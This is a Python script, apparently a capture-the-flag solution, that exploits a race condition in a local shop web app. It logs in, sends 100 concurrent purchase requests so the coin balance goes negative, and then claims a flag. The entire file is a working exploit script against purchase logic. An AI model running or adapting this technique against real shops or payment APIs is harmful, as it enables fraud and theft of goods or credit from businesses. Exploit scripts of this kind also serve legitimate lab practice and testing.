import asyncio
import aiohttp
import sys

BASE_URL = "http://localhost:5000"
PRODUCT_ID = 7
CONCURRENT_REQUESTS = 100


async def login(session, email, password):
    url = f"{BASE_URL}/login"
    data = {"email": email, "password": password}
    
    async with session.post(url, data=data, allow_redirects=False) as resp:
        return resp.status in [200, 302]


async def purchase_item(session, product_id):
    url = f"{BASE_URL}/api/shop/purchase"
    data = {"productId": product_id}
    
    async with session.post(url, json=data) as resp:
        return await resp.json()


async def check_status(session):
    url = f"{BASE_URL}/api/shop/status"
    async with session.get(url) as resp:
        return await resp.json()


async def claim_flag(session):
    url = f"{BASE_URL}/api/shop/claim-flag"
    async with session.get(url) as resp:
        return await resp.json()


async def attack(email, password):
    connector = aiohttp.TCPConnector(limit=150)
    jar = aiohttp.CookieJar()
    
    async with aiohttp.ClientSession(connector=connector, cookie_jar=jar) as session:
        print(f"\n[*] Logging in as {email}...")
        if not await login(session, email, password):
            print("[-] Login failed")
            return
        
        print("[+] Login successful")
        
        status = await check_status(session)
        if status.get('ok'):
            print(f"[*] Initial coins: {status['coin']}")
        
        print(f"\n[*] Sending {CONCURRENT_REQUESTS} concurrent requests...")
        
        tasks = [purchase_item(session, PRODUCT_ID) for _ in range(CONCURRENT_REQUESTS)]
        results = await asyncio.gather(*tasks)
        
        success = sum(1 for r in results if r.get('ok'))
        fail = len(results) - success
        
        print(f"[+] Purchase complete: {success} success, {fail} failed")
        
        status = await check_status(session)
        if status.get('ok'):
            coin = status['coin']
            print(f"[*] Final coins: {coin}")
            if coin < 0:
                print("[!] Negative coins! Race condition exploited!")
        
        print("\n[*] Claiming flag...")
        flag_result = await claim_flag(session)
        
        if flag_result.get('ok') and flag_result.get('flag'):
            print(f"\n{'='*60}")
            print(f"FLAG: {flag_result.get('flag')}")
            print(f"Coupons: {flag_result.get('couponCount')}")
            print(f"{'='*60}\n")
        else:
            print(f"[-] {flag_result.get('message')}")


def main():
    print("Race Condition Exploit")
    print(f"Target: {BASE_URL}")
    print("\nPlease register an account first at:")
    print(f"{BASE_URL}/signup\n")
    
    email = input("Email: ")
    password = input("Password: ")
    
    try:
        asyncio.run(attack(email, password))
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
    except Exception as e:
        print(f"\n[!] Error: {e}")


if __name__ == "__main__":
    main()